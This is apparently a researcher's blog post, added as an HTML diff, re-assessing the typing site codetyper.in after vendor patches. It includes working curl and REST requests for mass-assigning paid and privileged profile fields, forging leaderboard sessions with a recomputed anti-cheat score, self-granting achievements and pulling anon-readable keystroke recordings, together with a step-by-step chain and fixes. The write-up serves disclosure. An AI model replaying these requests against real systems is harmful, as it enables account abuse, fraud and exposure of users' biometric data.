@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A live re-assessment of codetyper.in after vendor patches. Most round-1 findings still open, plus new mass-assignment and anti-cheat bypasses.">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self'; script-src 'self'; style-src 'self'; connect-src 'self'; base-uri 'self'; form-action 'none';">
+<meta name="author" content="btea">
+<meta name="robots" content="noarchive">
+<link rel="canonical" href="https://btea.dev/blog/codetyper-still-broken.html">
+<meta property="og:title" content="Still Broken: Re-assessing codetyper.in After Patches">
+<meta property="og:description" content="A live re-assessment of codetyper.in after vendor patches. Most round-1 findings still open, plus new mass-assignment and anti-cheat bypasses.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://btea.dev/blog/codetyper-still-broken.html">
+<meta property="article:published_time" content="2026-06-29">
+<meta name="twitter:card" content="summary">
+<link rel="preload" as="font" type="font/woff2" href="../fonts/Redaction_50-Regular.woff2" crossorigin>
+<link rel="stylesheet" href="../style.css">
+<title>Still Broken: Re-assessing codetyper.in / btea.dev</title>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+<header>
+<h1>Still Broken: Re-assessing codetyper.in After Patches</h1>
+<nav><a href="./index.html">blog</a></nav>
+</header>
+<main id="main">
+<p class="post-meta"><time datetime="2026-06-29">June 29, 2026</time></p>
+
+<h2 id="context"><a href="#context">#</a> Context</h2>
+<p>In April 2026 I disclosed a set of critical vulnerabilities in <a href="./from-regular-user-to-super-admin.html">codetyper.in</a>. The vendor patched the admin IDOR. I came back in late May and late June to see what else stuck. The short version: the admin IDOR stayed fixed. Everything else didn't.</p>
+
+<h2 id="patch-status"><a href="#patch-status">#</a> Patch status</h2>
+<table>
+<tr><th>Round-1 finding</th><th>Patched?</th><th>Notes</th></tr>
+<tr><td>Admin IDOR</td><td><strong>Yes</strong></td><td>RLS on <code>admins</code> scoped to <code>auth.uid()</code>.</td></tr>
+<tr><td>Private profile bypass</td><td><strong>Yes</strong></td><td><code>profile_public=false</code> rows filtered from anon.</td></tr>
+<tr><td>RLS on <code>profiles</code></td><td><strong>No</strong></td><td>96 full records still served to anon.</td></tr>
+<tr><td>RLS on <code>sessions</code></td><td><strong>No</strong></td><td>899 records. Now also leaks <code>flag_reason</code>, <code>moderator_note</code>.</td></tr>
+<tr><td>RLS on <code>ghost_recordings</code></td><td><strong>No</strong></td><td>827 keystroke recordings, still joinable to usernames + snippet content.</td></tr>
+<tr><td>Early-access code</td><td><strong>Partially (logic fixed, same code)</strong></td><td>Moved server-side, same code still validates.</td></tr>
+</table>
+
+<h2 id="mass-assign"><a href="#mass-assign">#</a> Profiles mass assignment</h2>
+<p>The RLS UPDATE policy on <code>profiles</code> restricts which <em>rows</em> you can modify but not which <em>columns</em>. Any authenticated user can set whatever they want on their own row:</p>
+<pre><code>curl -X PATCH "$SUPA/rest/v1/profiles?id=eq.$MY_ID" \
+  -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" \
+  -d '{"is_plus":true,"is_bot":true,"longest_streak":999,
+       "current_streak":365,"total_sessions":100}'
+# HTTP 200 — all values applied</code></pre>
+<p><code>is_plus</code>, <code>is_bot</code>, streaks, <code>total_sessions</code>, <code>showcase_achievements</code>, <code>username</code> — all directly settable. Free Plus, fake streaks, the username <code>admin</code> (nobody had claimed it).</p>
+
+<h2 id="username"><a href="#username">#</a> Username takeover</h2>
+<p>Same column-level gap. You can change your username to any unclaimed string — <code>admin</code>, <code>support</code>, <code>moderator</code> were all available. <code>username_changed_at</code> didn't update after the PATCH, so there's no cooldown either.</p>
+<pre><code>curl -X PATCH "$SUPA/rest/v1/profiles?id=eq.$MY_ID" \
+  -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" \
+  -d '{"username":"admin"}'
+# HTTP 200 — "username":"admin"</code></pre>
+
+<h2 id="session-forge"><a href="#session-forge">#</a> Session forgery</h2>
+<p>Any authenticated user can POST sessions with forged WPM, accuracy, and score. A server-side trigger checks for score mismatches and sets <code>flagged_for_review: true</code>, but the session is still inserted and <code>total_sessions</code> still increments. The anti-cheat formula is in the public bundle:</p>
+<pre><code>function QC(nckpm, accuracy, perfect) {
+  return round(nckpm^0.65 * accuracy^1.5 * 17.8 * (perfect ? 1.05 : 1));
+}</code></pre>
+<p>Compute a matching <code>deft_score</code> and the session passes unflagged:</p>
+<pre><code>POST /rest/v1/sessions
+  {"nckpm":600, "accuracy":97.5, "deft_score":1096, "tier":"ELITE"}
+  -->  HTTP 201 — not flagged</code></pre>
+<p>Twenty forged sessions later my test account hit <strong>#1 on the Python leaderboard</strong> with a rolling average of 1027.75 (previous #1 was 961).</p>
+<p><img src="../images/blog/leaderboard.png" alt="#1 position on the codetyper.in Python leaderboard after submitting 20 forged sessions" loading="lazy" decoding="async" width="638" height="714"></p>
+
+<h2 id="achievements"><a href="#achievements">#</a> Self-grant achievements</h2>
+<p><code>user_achievements</code> has no RLS on INSERT, and the <code>achievements</code> table is anon-readable, so every achievement ID is known. Grant yourself whatever:</p>
+<pre><code>POST /rest/v1/user_achievements
+  {"user_id":"&lt;self&gt;","achievement_id":"speed_80"}
+POST /rest/v1/user_achievements
+  {"user_id":"&lt;self&gt;","achievement_id":"speed_100"}
+--&gt; HTTP 201 — both granted</code></pre>
+<p>I granted 11 including <code>streak_365</code>, <code>speed_80</code>, and <code>speed_100</code>. They show on the public profile via <code>showcase_achievements</code>.</p>
+
+<h2 id="profile-result"><a href="#profile-result">#</a> The result</h2>
+<p>Combined with the mass-assignment PATCH above, the forged profile looked like this:</p>
+<p><img src="../images/blog/forged-profile.png" alt="Forged codetyper.in profile showing Plus badge, 999-day streak, ELITE tier, and all achievements" loading="lazy" decoding="async" width="638" height="704"></p>
+
+<h2 id="regressions"><a href="#regressions">#</a> Still anon-readable</h2>
+<ul>
+<li><strong>profiles</strong> — 96 records with bio, social handles, streak stats, <code>is_plus</code>.</li>
+<li><strong>sessions</strong> — 899 records. New columns: <code>flagged_for_review</code>, <code>flag_reason</code>, <code>moderator_note</code>. Anyone can see who's been flagged and why.</li>
+<li><strong>ghost_recordings</strong> — 827 keystroke-biometric recordings, joinable to <code>profiles(username)</code> and <code>snippets(content)</code> in one query.</li>
+</ul>
+<pre><code>curl "$SUPA/rest/v1/ghost_recordings?\
+select=user_id,profiles(username),snippets(content),recording_json&limit=10" \
+  -H "apikey: $KEY"</code></pre>
+
+<h2 id="chain"><a href="#chain">#</a> Full chain</h2>
+<pre><code>1. Register account (no email confirmation, no rate limit)
+2. PATCH profiles → is_plus, is_bot, streak=999
+3. POST user_achievements → speed_80, speed_100, anything
+4. Compute matching score from the public formula
+5. POST sessions × 20 → all pass anti-cheat
+6. #1 on the Python leaderboard, Plus, ELITE, 999-day streak, all achievements</code></pre>
+<p>Three minutes of curl.</p>
+
+<h2 id="blocked"><a href="#blocked">#</a> What's blocked</h2>
+<p>The admin IDOR fix is solid. These all fail appropriately:</p>
+<table>
+<tr><th>Endpoint</th><th>Result</th></tr>
+<tr><td>INSERT into <code>admins</code></td><td><code>42501</code></td></tr>
+<tr><td>SELECT from <code>admins</code> (other rows)</td><td><code>[]</code></td></tr>
+<tr><td><code>auth/v1/admin/*</code></td><td><code>403 not_admin</code></td></tr>
+<tr><td>INSERT into <code>blog_posts</code>, <code>changelogs</code>, <code>roadmap_items</code></td><td><code>42501</code></td></tr>
+<tr><td><code>ghost_recordings</code> with foreign <code>user_id</code></td><td><code>403</code></td></tr>
+<tr><td>JWTs</td><td>ES256, not forgeable</td></tr>
+</table>
+
+<h2 id="fix"><a href="#fix">#</a> Fix</h2>
+<p>Postgres RLS is row-level only. Column-level write protection needs either a <code>BEFORE UPDATE</code> trigger that rejects changes to protected columns (<code>is_plus</code>, <code>is_bot</code>, streaks, <code>username</code>) by non-service-role JWTs, or a <code>SECURITY DEFINER</code> RPC that only accepts user-editable fields. <code>is_plus</code> should only be writable by the billing webhook. The anti-cheat should hard-reject mismatches instead of soft-flagging, and <code>ghost_recordings</code> needs RLS.</p>
+
+<hr>
+
+<h2 id="timeline"><a href="#timeline">#</a> Timeline</h2>
+<table>
+<tr><th>Date</th><th>Breakthrough</th></tr>
+<tr><td><time datetime="2026-04-17">April 17, 2026</time></td><td>Round 1: check first post for more info :) </td></tr>
+<tr><td><time datetime="2026-04-19">April 19, 2026</time></td><td>Round 1 reported to vendor</td></tr>
+<tr><td><time datetime="2026-04-20">April 20, 2026</time></td><td>Vendor confirms patches</td></tr>
+<tr><td><time datetime="2026-04-21">April 21, 2026</time></td><td>Round 1 write-up published</td></tr>
+<tr><td><time datetime="2026-05-30">May 30, 2026</time></td><td>Round 2: re-test. Most findings still open.</td></tr>
+<tr><td><time datetime="2026-06-25">June 25, 2026 (resumed after exams)</time></td><td>Round 3: live demo, #1 on the leaderboard.</td></tr>
+<tr><td><time datetime="2026-06-29">June 29, 2026</time></td><td>Write-up published.</td></tr>
+</table>
+
+<hr>
+
+<h2 id="tldr"><a href="#tldr">#</a> TL:DR</h2>
+<ul>
+<li>Admin IDOR: fixed.</li>
+<li>Anon data leaks (profiles, sessions, ghost_recordings): still open. Moderation metadata now exposed too.</li>
+<li><code>profiles</code> mass assignment: set <code>is_plus</code>, streaks, username, <code>is_bot</code> — whatever you want.</li>
+<li>Anti-cheat: formula is in the public bundle. Submit matching scores, pass unflagged.</li>
+<li>I hit #1 on the Python leaderboard in 3 minutes.</li>
+<li>Fix: column-level write protection, hard-reject mismatches, RLS on <code>ghost_recordings</code>.</li>
+</ul>
+
+<hr>
+
+<p><em>All testing performed with authorization. Only throwaway accounts were modified; changes were reverted promptly after disclosure. No other user data was touched. Content disclosure: The development of this specific page was aided with AI tools.</em></p>
+
+<p class="back-link">← <a href="../index.html">btea.dev</a></p>
+</main>
+
+<footer><p>© 2026 btea.dev · <a href="https://github.com/itsbt125/btea.dev" target="_blank" rel="noopener noreferrer">Source Code</a></p></footer>
+<script src="post.js" defer></script>
+</body>
+</html>
